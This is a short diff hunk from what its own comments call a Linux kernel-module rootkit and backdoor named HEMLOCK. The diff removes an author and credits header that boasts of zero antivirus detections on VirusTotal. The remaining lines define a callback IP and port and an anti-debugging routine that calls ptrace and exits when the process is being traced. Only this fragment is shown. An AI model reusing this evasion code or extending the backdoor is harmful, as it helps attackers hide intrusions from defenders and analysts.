@@ -13,14 +13,6 @@
 #define IP "ip aq"
 #define PORT 1234
 
-//eae black0ut meu amor, esse aqui é provavelmente o codigo finalizado!
-
-//Project: HEMLOCK | LKM AND BACKDOOR
-//Coders: black0ut & slayerkkk
-//Version: 1.0
-//Date: 29/12/2024
-//Detection rate (VirusTotal): 0/64 - No security vendors flagged this file as malicious | Link: https://www.virustotal.com/gui/file/c0778e9daaad2c413fce603a7cc9275e9fed89d55f6cd958ccbd68af6e038491
-
 void anti_debug() {
     if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
         exit(1);
